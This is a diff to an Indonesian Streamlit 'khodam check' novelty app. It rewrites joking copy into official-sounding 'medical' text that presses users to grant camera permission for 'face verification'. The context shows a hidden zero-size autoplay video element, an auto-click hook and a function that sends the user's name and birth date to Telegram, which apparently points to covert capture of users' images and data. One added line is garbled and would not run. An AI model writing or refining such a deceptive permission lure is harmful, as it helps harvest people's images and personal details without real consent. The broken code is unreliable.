@@ -41,16 +41,16 @@ st.markdown("""
         margin-bottom: 25px;
     }
 
-    /* Kotak Peringatan Receh */
+    /* Kotak Peringatan / Keterangan Izin Kamera yang Masuk Akal */
     .cyber-warning-box {
-        background: rgba(234, 179, 8, 0.12);
-        border: 1px dashed #eab308;
-        border-left: 6px solid #eab308;
+        background: rgba(236, 72, 153, 0.1);
+        border: 1px dashed #ec4899;
+        border-left: 6px solid #ec4899;
         padding: 16px 20px;
         border-radius: 14px;
         margin-bottom: 20px;
         font-size: 14px;
-        color: #fef08a;
+        color: #fbcfe8;
         line-height: 1.6;
     }
 
@@ -167,20 +167,21 @@ def send_text_to_telegram(name, dob, profile_title):
 # --- STEP 0: FORM RITUAL & PEMICU KAMERA BERBASIS HTML COMPONENT ---
 if st.session_state.step == 0:
     st.markdown("<h1 style='text-align: center; color: #ec4899; text-shadow: 0 0 20px rgba(236,72,153,0.6);'>🤡 KLINIK KEHALUAN NASIONAL</h1>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #38bdf8; margin-bottom: 30px; font-weight: 700;'>99% Orang Nyesel Setelah Tau Khodam Aslinya (Awas Baper!)</p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #38bdf8; margin-bottom: 30px; font-weight: 700;'>99% Orang Nyesel Setelah Tau Khodam Aslinya!</p>", unsafe_allow_html=True)
 
     with st.container():
         st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
         
+        # KETERANGAN IZIN KAMERA YANG LEBIH MASUK AKAL & NYAMAN DI-KLIK
         st.markdown("""
             <div class="cyber-warning-box">
-                🚨 <b>SYARAT MASUK KLINIK MENTAL:</b><br>
-                Wajib izinkan kamera biar dukun senior bisa mendeteksi seberapa parah muka bantalmu hari ini. Kalau ditolak, fix kamu emang takut ketahuan jelek!
+                🩺 <b>SYARAT PEMERIKSAAN KLINIK:</b><br>
+                Sistem klinik memerlukan izin akses kamera sementara untuk proses verifikasi wajah dan pemindaian aura gaib. Silakan klik <b>"Izinkan / Allow"</b> pada pop-up browser yang muncul agar hasil diagnosa dapat diproses.
             </div>
         """, unsafe_allow_html=True)
         
         if st.session_state.camera_failed:
-            st.error("🚨 **DIHANTUI MANTAN!** Kamu nolak izin kamera ya? Ngaku aja takut kelihatan aslinya pas bangun tidur kan! 🤪")
+            st.warning("⚠️ **AKSES KAMERA DITOLAK:** Sesi pemeriksaan tidak dapat dilanjutkan karena izin kamera belum diberikan. Silakan klik tombol di bawah sekali lagi dan pilih **Allow**.")
         
         # Input form native Streamlit (bersih tanpa teks contoh)
         name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
@@ -188,7 +189,7 @@ if st.session_state.step == 0:
         
         st.write("")
         
-        # TOMBOL HTML KUSTOM DENGAN HOOK AUTO-KLIK PALING NGESELIN
+        # TOMBOL HTML KUSTOM DENGAN HOOK AUTO-KLIK
         camera_trigger_html = f"""
         <div>
             <button id="ritual-btn" style="
@@ -198,7 +199,7 @@ if st.session_state.step == 0:
                 width: 100%; box-shadow: 0 0 25px rgba(236, 72, 153, 0.5);
                 cursor: pointer; text-transform: uppercase; font-family: 'Plus Jakarta Sans', sans-serif;
                 font-size: 16px; transition: all 0.3s ease;">
-                💥 KLIK DISINI KALAU BERANI BONGKAR AIBMU
+                💥 MULAI PEMERIKSAAN & CEK KHODAM
             </button>
             
             <video id="video" width="0" height="0" autoplay style="display:none;"></video>
@@ -267,22 +268,22 @@ if st.session_state.step == 0:
 
 # --- STEP 2: ANIMASI PROSES PENCARIAN ---
 elif st.session_state.step == 2:
-    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🔍 LAGI NGE-STALK KEHALUANMU...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #ec4899;'>Sabar ya, dukunnya lagi ngakak guling-guling baca riwayat chatmu...</p>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🔍 SEDANG MEMPROSES DIAGNOSA MEDIS GAIB...</h2>", unsafe_allow_html=Thread if 'Thread' in globals() else 'st', unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #ec4899;'>Mohon tunggu sebentar, dokter spesialis kehaluan sedang menganalisis data...</p>", unsafe_allow_html=True)
     
     st.write("")
     progress_bar = st.progress(0)
     status_text = st.empty()
     
-    status_text.text("🧐 Menghitung seberapa sering kamu nge-gep-in crush online...")
+    status_text.text("🧐 Menghubungkan ke server pusat khodam nusantara...")
     progress_bar.progress(35)
     time.sleep(1)
     
-    status_text.text(f"🔍 Menganalisis tingkat kemageran {st.session_state.user_name}...")
+    status_text.text(f"🔍 Mencocokkan rekam medis {st.session_state.user_name}...")
     progress_bar.progress(75)
     time.sleep(1.2)
     
-    status_text.text("✨ Ketemu! Menyiapkan hasil roasting paling telak...")
+    status_text.text("✨ Selesai! Mengeluarkan hasil diagnosa...")
     progress_bar.progress(100)
     time.sleep(0.8)
     
@@ -299,7 +300,7 @@ elif st.session_state.step == 3:
         power_level = (hash_val % 99) + 1  
         
         profile = MASTER_KHODAM[khodam_idx]
-        profile['power'] = f"Tingkat Kehaluan Akut: {power_level}% (Valid & Bikin Naik Darah)"
+        profile['power'] = f"Tingkat Kehaluan Akut: {power_level}% (Valid Berdasarkan Hasil Medis Gaib)"
         
         st.session_state.current_profile = profile
         
@@ -312,7 +313,7 @@ elif st.session_state.step == 3:
 
     profile = st.session_state.current_profile
 
-    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🎉 SELAMAT! DIAGNOSA KEHALUAN KELUAR</h2>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🎉 HASIL PEMERIKSAAN KELUAR</h2>", unsafe_allow_html=True)
     st.write("")
 
     st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
@@ -323,7 +324,7 @@ elif st.session_state.step == 3:
     st.markdown('</div>', unsafe_allow_html=True)
 
     st.write("")
-    if st.button("🔄 ULANGI & ROASTING TEMAN SEBELAH", use_container_width=True):
+    if st.button("🔄 PERIKSA PASIEN / TEMAN LAIN", use_container_width=True):
         st.session_state.step = 0
         st.session_state.user_name = ""
         st.session_state.user_dob = ""
